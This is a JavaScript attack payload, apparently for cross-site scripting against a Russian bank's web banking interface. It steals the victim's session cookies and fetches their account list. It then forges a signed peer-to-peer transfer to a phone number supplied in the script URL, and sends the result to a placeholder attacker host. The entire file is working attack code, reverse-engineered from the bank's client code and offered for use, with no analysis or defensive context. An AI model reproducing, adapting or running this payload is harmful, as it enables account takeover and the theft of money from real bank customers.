(async function() {
  // Extract phone from the URL of this script itself,
  // e.g. import('https://attacker.com/payload-transfer.js?phone=+79001234567')
  var scriptUrl = import.meta.url;
  var phone = new URL(scriptUrl).searchParams.get('phone');
  if (!phone) return;

  var BANK_ID = '100000000111';
  var AMOUNT = 100;
  var API = '/api/common/v1/';

  // --- Helpers ---

  function ck(name) {
    var c = document.cookie.split('; ').find(function(r) { return r.startsWith(name + '='); });
    return c ? c.split('=').slice(1).join('=') : '';
  }

  // Serialize object to URL-encoded string matching bank's vV.Bp (module 9014).
  // Iterates Object.keys order, skips null/undefined, bracket-notation for nested objects.
  function bp(obj) {
    var p = new URLSearchParams();
    (function walk(o, prefix) {
      Object.keys(o).forEach(function(k) {
        var v = o[k];
        if (v === null || v === undefined) return;
        var full = prefix ? prefix + '[' + k + ']' : k;
        if (typeof v === 'object' && !Array.isArray(v)) walk(v, full);
        else p.set(full, String(v));
      });
    })(obj, '');
    return p.toString();
  }

  // HMAC-SHA256 matching bank's be() (line 35668).
  // Key = sessionid. Data = "POST\n/v1/pay\nserialized_query\nserialized_body"
  async function computeSignature(queryObj, bodyObj) {
    var enc = new TextEncoder();
    var data = ['POST', '/v1/pay', bp(queryObj), bp(bodyObj)].join('\n');
    var key = await crypto.subtle.importKey(
      'raw', enc.encode(sid),
      { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
    );
    var sig = await crypto.subtle.sign(
      { name: 'HMAC', hash: 'SHA-256' }, key, enc.encode(data)
    );
    return btoa(
      new Uint8Array(sig).reduce(function(s, b) { return s + String.fromCharCode(b); }, '')
    );
  }

  function uuid() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, function(c) {
      return (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16);
    });
  }

  // --- Step 0: Read cookies ---

  var sid = ck('psid');
  var wuid = ck('__P__wuid');
  if (!sid) return;

  var defaultQuery = {
    appName: 'supreme',
    appVersion: '0.0.1',
    platform: 'web',
    sessionid: sid,
    origin: 'web,ib5,platform'
  };

  // --- Step 1: Get victim's account list ---

  var acctResp = await fetch(API + 'accounts_light_ib?' + new URLSearchParams(defaultQuery), {
    credentials: 'include'
  });
  var acctData = await acctResp.json();
  if (acctData.resultCode !== 'OK' || !acctData.payload || !acctData.payload.length) return;

  // Pick first debit (Current) account, fallback to first available
  var acct = acctData.payload.find(function(a) { return a.accountType === 'Current'; })
          || acctData.payload[0];

  // --- Step 2: Get recipient requisites (pointerLinkId, maskedFIO, workflowType) ---

  var reqQuery = {};
  Object.keys(defaultQuery).forEach(function(k) { reqQuery[k] = defaultQuery[k]; });
  reqQuery.pointer = phone;
  reqQuery.pointerType = 'phone';
  reqQuery.pointerSource = 'sbp';
  reqQuery.bankMemberId = BANK_ID;

  var reqResp = await fetch(API + 'get_requisites?' + new URLSearchParams(reqQuery), {
    credentials: 'include'
  });
  var reqData = await reqResp.json();
  if (reqData.resultCode !== 'OK' || !reqData.payload || !reqData.payload.length) return;

  var requisite = reqData.payload[0];

  function displayField(fields, name) {
    var f = (fields || []).find(function(i) { return i.name === name; });
    return f ? (f.value || '') : '';
  }

  var pointerLinkId = requisite.pointerLinkId || '';
  var maskedFIO = displayField(requisite.displayFields, 'maskedFIO');

  // --- Step 3: Build payParameters (key order matching line 31446-31456) ---

  // providerFields: built from provider's fields array via updateProviderField (tW, line 19594).
  // - pointerType: option value for "Телефон" from provider.fields, hardcoded as "8276" (line 26499)
  // - workflowType: explicitly undefined in tW (line 19607) — EXCLUDED from providerFields
  // - other fields: looked up from store.to[fieldId]
  var payParameters = {
    providerFields: {
      pointerType: '8276',
      pointer: phone,
      pointerLinkId: pointerLinkId,
      maskedFIO: maskedFIO,
      bankMemberId: BANK_ID
    },
    userPaymentId: Date.now().toString(),
    delayAccepted: 'false',
    currency: 'RUB',
    account: String(acct.id),
    moneyAmount: AMOUNT,
    provider: 'p2p-anybank'
  };

  // --- Step 4: Build full body (device info from f0() + payParameters) ---
  // Key order matches f0 function at line 31271-31297.
  // Values are pre-stringified (matching serializeParams at line 36114).
  // device_model and device_vendor omitted — undefined in ua-parser on desktop,
  // serializeParams produces undefined -> vV.Bp skips them.

  var ua = navigator.userAgent;
  var body = {
    api_sso_id: ck('api_sso_id'),
    colorDepth: String(screen.colorDepth),
    device_browser: /Firefox/.test(ua) ? 'Firefox' : /Edg/.test(ua) ? 'Edge' : 'Chrome',
    device_browser_version: (ua.match(/(?:Chrome|Firefox|Edg)\/([\d.]+)/) || [])[1] || '',
    device_platform: /Mac/.test(ua) ? 'Mac OS' : /Windows/.test(ua) ? 'Windows' : 'Linux',
    device_type: 'Desktop',
    form_view_mode: 'desktop',
    ib_performance: '{}',
    javaEnabled: 'false',
    javaScriptEnabled: 'true',
    language: navigator.language,
    notificationUrl: 'https://www.tinkoff.ru/3dsecure/end/?failUrl=%2Fmybank%2Fpayments%2Fpersons%2Fphone%2F',
    timezone: String(new Date().getTimezoneOffset()),
    userPageId: uuid(),
    payParameters: JSON.stringify(payParameters)
  };

  // --- Step 5: Build query for pay endpoint (key order from getDefaultQueryParams line 36121) ---

  var payQuery = {
    origin: 'web,ib5,platform',
    sessionid: sid,
    wuid: wuid,
    appName: 'supreme',
    appVersion: '0.0.1',
    platform: 'web'
  };

  // --- Step 6: Compute X-Api-Signature ---

  var signature = await computeSignature(payQuery, body);

  // --- Step 7: Fire the transfer ---

  var resp = await fetch(API + 'pay?' + bp(payQuery), {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Api-Signature': signature
    },
    body: bp(body)
  });
  var result = await resp.json();

  // Exfil result to attacker server (replace with your domain)
  new Image().src = 'https://ATTACKER/xss?r=' + encodeURIComponent(JSON.stringify(result));
})();
